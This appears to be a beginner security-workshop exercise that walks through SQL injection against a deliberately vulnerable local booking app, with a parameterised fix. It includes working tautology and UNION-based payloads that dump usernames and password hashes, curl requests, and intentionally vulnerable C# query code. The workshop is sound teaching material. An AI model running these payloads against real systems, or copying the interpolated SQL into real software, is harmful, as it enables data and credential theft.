# Exercise 03 — SQL Injection: Booking Search

**Difficulty:** Beginner  
**Category:** Injection  
**OWASP Top 10:** A03:2021 — Injection  
**Config flag:** `BookingDojo:Workshop:BookingSearchSqlInjection`

---

## Scenario

BookingDojo has a **Search Bookings by Hotel** feature on the Bookings page. You type a hotel name and see your matching bookings.

The search is backed by a database query. If that query is built by concatenating user input into a SQL string instead of using parameters, an attacker can break out of the intended query structure and read data that belongs to other users.

---

## Background

**SQL Injection** occurs when untrusted input is embedded directly into a SQL statement. The database cannot distinguish between the developer's intent and the attacker's payload — it executes whatever SQL it receives.

The classic defence is **parameterised queries**: the query structure is sent to the database first, and user input is bound separately as typed values. The database never interprets the input as SQL syntax.

Modern ORMs like Entity Framework Core use parameterised queries by default. The vulnerability re-appears when developers bypass the ORM to write raw SQL for performance or convenience — and forget to parameterise.

---

## Step 1 — Observe the attack surface

The database is pre-seeded with bookings owned by different users:

| Booking ID | Owner   | Hotel                  | Card last 4 |
|-----------|---------|------------------------|-------------|
| 1         | admin   | Alpine Lodge           | 1234        |
| 2         | partner | Beach Paradise Resort  | 4242        |

Log in as `partner / Partner1234!` at `http://localhost:5173`.

Navigate to **Bookings**. Below the New Booking form there is a **Search Bookings by Hotel** bar.

1. Search for `Beach` — you see Booking #2 (your own booking at Beach Paradise Resort).
2. Search for `Alpine` — no results. Booking #1 belongs to `admin`, not you.

The search correctly scopes results to your account — at least for normal input.

---

## Step 2 — Exploit the injection via the UI

In the **Search Bookings by Hotel** box, type the following and click **Search**:

```
%' OR '1'='1' --
```

The results table now shows **all bookings from all users**:

| ID | User | Hotel | Check-in | Check-out | Card |
|----|------|-------|----------|-----------|------|
| #1 | admin | Alpine Lodge | … | … | **** **** **** 1234 |
| #2 | partner | Beach Paradise Resort | … | … | **** **** **** 4242 |

You can read `admin`'s card number even though you are logged in as `partner`. The user ownership filter has been bypassed entirely.

### Why the payload works

The vulnerable SQL template is:

```sql
WHERE b."UserId" = '{userId}' AND h."Name" ILIKE '%{q}%'
```

After substituting the payload for `{q}`:

```sql
WHERE b."UserId" = 'your-uuid' AND h."Name" ILIKE '%' OR '1'='1' --%'
```

- `'%'` closes the `ILIKE` string literal.
- `OR '1'='1'` is always true.
- `--` comments out the trailing `%'`.

SQL operator precedence evaluates `AND` before `OR`, so the full predicate becomes:

```
(b."UserId" = '...' AND h."Name" ILIKE '%') OR true
```

`OR true` makes every row match. The user-ownership filter is gone.

---

## Step 3 — Exploit via curl

```bash
# Log in as partner — session cookie saved to cookies.txt
curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Partner1234!"}' | jq .

# Normal search — returns only partner's bookings
curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=Sunset" | jq .

# Injection payload — returns all users' bookings
curl -s -b cookies.txt \
  "http://localhost:5001/bff/bookings/search?q=%25%27%20OR%20%271%27%3D%271%27%20--" | jq .
```

Expected response from the injection request includes `admin`'s booking:

```json
[
  {
    "id": 1,
    "username": "admin",
    "cardLastFour": "1234",
    ...
  },
  {
    "id": 2,
    "username": "partner",
    "cardLastFour": "4242",
    ...
  }
]
```

---

## Step 4 — Enumerate the database and extract credentials via the UI

The `OR '1'='1'` payload leaks cross-user booking data. A more sophisticated attacker uses **UNION-based injection** to query any table in the database — including the `Users` table.

### How UNION injection works

A `UNION SELECT` appends extra rows to the original result set. The injected SELECT must have:
- The **same number of columns** as the original query
- **Compatible types** in each position

The original query selects 11 columns in this order:

| # | Column | Type | Visible in UI as |
|---|--------|------|-----------------|
| 1 | Id | integer | **ID** |
| 2 | UserId | uuid | (hidden) |
| 3 | Username | text | **User** |
| 4 | HotelId | uuid | (hidden) |
| 5 | CardLastFour | text | **Card** (prefixed with `**** **** **** `) |
| 6 | CheckIn | timestamp | **Check-in** |
| 7 | CheckOut | timestamp | **Check-out** |
| 8 | SpecialRequests | text | (hidden) |
| 9 | TotalPrice | decimal | (hidden) |
| 10 | CreatedAt | timestamp | (hidden) |
| 11 | HotelName | text | **Hotel** |

The strategy: put a recognisable marker in column 11 (shown as **Hotel**) so you can spot injected rows, and exfiltrate data through columns 3 (**User**) and 5 (**Card**).

> **Pagination note:** The database is seeded with only 2 bookings, so UNION rows will always fit within the UI's 10-result cap.

### Step 4a — Discover schemas

Paste into the search box and click **Search**:

```
%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',schema_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',0.00,NOW(),'SCHEMAS' FROM information_schema.schemata --
```

In the results table, look for rows where **Hotel = SCHEMAS** — the **User** column contains each schema name:

| ID | User | Hotel |
|----|------|-------|
| #1 | admin | Alpine Lodge |
| #2 | partner | Beach Paradise Resort |
| #1 | bookingdojo | SCHEMAS |
| #1 | public | SCHEMAS |
| #1 | pg_catalog | SCHEMAS |
| … | … | … |

`bookingdojo` is the schema that holds the application tables.

### Step 4b — Discover tables

```
%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',table_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',0.00,NOW(),'TABLES' FROM information_schema.tables WHERE table_schema='bookingdojo' --
```

Rows where **Hotel = TABLES** list every table in the **User** column: `Users`, `Bookings`, `Hotels`, `Coupons`, `PasswordResetTokens`.

### Step 4c — Discover columns in Users

```
%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',column_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',0.00,NOW(),'COLUMNS' FROM information_schema.columns WHERE table_schema='bookingdojo' AND table_name='Users' --
```

Rows where **Hotel = COLUMNS** reveal the column names in **User**: `Id`, `Username`, `PasswordHash`, `Role`, `PartnerId`.

### Step 4d — Extract usernames and password hashes

Now the attacker knows the exact table and column names. Paste this final payload:

```
%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',"Username",'00000000-0000-0000-0000-000000000000',"PasswordHash",NOW(),NOW(),'INJECTED',0.00,NOW(),'PWNED' FROM bookingdojo."Users" --
```

In the results table, rows where **Hotel = PWNED** contain the full credential dump:

| ID | User | Hotel | Card |
|----|------|-------|------|
| #1 | admin | Alpine Lodge | **** **** **** 1234 |
| #2 | partner | Beach Paradise Resort | **** **** **** 4242 |
| #1 | admin | PWNED | **** **** **** $2a$11$… |
| #1 | partner | PWNED | **** **** **** $2a$11$… |
| #1 | support | PWNED | **** **** **** $2a$11$… |

- **User** column → account username
- **Card** column → bcrypt password hash (the UI prepends `**** **** **** ` but the full hash is visible)

---

## Step 6 — Understand why it works

Open `src/BookingDojo.Api/Controllers/BookingsController.cs` and find `SearchBookings`:

```csharp
// WORKSHOP: VULNERABLE PATH
var sql = $"""
    SELECT b."Id", b."UserId", ...
    FROM bookingdojo."Bookings" b
    JOIN bookingdojo."Hotels" h ON b."HotelId" = h."Id"
    WHERE b."UserId" = '{userId}' AND h."Name" ILIKE '%{q}%'
    ORDER BY b."CreatedAt" DESC
    """;
```

`q` is a C# string interpolated directly into the SQL text. The database receives whatever the caller sends — including SQL syntax.

---

## Step 7 — How it works at runtime

```
GET /api/bookings/search?q=%25' OR '1'='1' --
        │
        ▼
SearchBookings(q = "%' OR '1'='1' --")
        │
        ├─ Vulnerable: q interpolated into SQL string
        │       │
        │       ▼
        │  SQL sent to PostgreSQL:
        │  WHERE "UserId" = '...' AND "Name" ILIKE '%' OR '1'='1' --%'
        │       │
        │       └─► OR '1'='1' is always true → all rows returned
        │
        └─ Fixed: EF Core LINQ — q never touches SQL
                │
                ▼
           SQL sent to PostgreSQL:
           WHERE "UserId" = $1          ← userId as typed parameter
                │
                └─► q filtered in C# on already-fetched rows
                    payload matches no hotel name → no extra results
```

## Step 7 — Apply the fix

In `appsettings.json`, change the flag:

```json
"BookingSearchSqlInjection": "Fixed"
```

Restart the API and re-run the injection curl command.

**Expected result:** only `partner`'s own booking, even with the payload.

The fixed code path:

```csharp
// WORKSHOP: FIXED PATH
// userId goes to PostgreSQL as a typed parameter — q never touches SQL at all.
var allUserBookings = await _db.Bookings
    .Include(b => b.Hotel)
    .Where(b => b.UserId == userId)
    .OrderByDescending(b => b.CreatedAt)
    .ToListAsync();

var filtered = string.IsNullOrEmpty(q)
    ? allUserBookings
    : allUserBookings.Where(b => b.Hotel.Name.Contains(q, StringComparison.OrdinalIgnoreCase)).ToList();
```

EF Core translates the database query to:

```sql
WHERE b."UserId" = $1
```

`$1` is a bound parameter — the database never sees `q`. The hotel name filter then runs as C# code on the already-fetched results. The payload `%' OR '1'='1' --` becomes a literal C# string that simply matches no hotel name.

---

## Step 8 — Discussion

| Approach | Secure? | Notes |
|----------|---------|-------|
| String concatenation into raw SQL | ✗ | Classic injection. Any quoting in user input can break out of the literal. |
| `string.Format` / interpolation into SQL | ✗ | Same problem — still concatenation. |
| ORM LINQ (EF Core) | ✓ | Generates parameterised SQL by default. The safe path for most queries. |
| `FromSqlRaw` with `{0}` placeholders | ✓ | EF Core parameterises these. Safe — but only if you use the placeholder syntax, not interpolation. |
| `FromSqlInterpolated` | ✓ | Uses C# interpolated strings but converts them to parameters. Safe. |
| Stored procedures with parameters | ✓ | Parameters are bound outside the SQL string. |
| Input validation / allow-lists | ✗ (alone) | Fragile. Character filters are bypassable. Parameterisation is the real fix; validation is defence-in-depth. |

---

## Key Takeaways

- **Concatenation is the root cause.** Wherever user input is embedded into a SQL string, injection is possible — regardless of the language, framework, or quoting style.
- **Parameters are the fix.** The query structure and the data must reach the database separately. Modern ORMs do this for you; raw SQL requires discipline.
- **ORMs are not magic.** EF Core is safe by default, but `FromSqlRaw` with interpolated strings, or dropping down to ADO.NET with concatenation, re-introduces the vulnerability.
- **The WHERE clause is not the only target.** ORDER BY, LIMIT, table names, and column names cannot be parameterised — those require allow-lists if they come from user input.

---

## Further Reading

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [EF Core Raw SQL Queries](https://learn.microsoft.com/en-us/ef/core/querying/sql-queries)
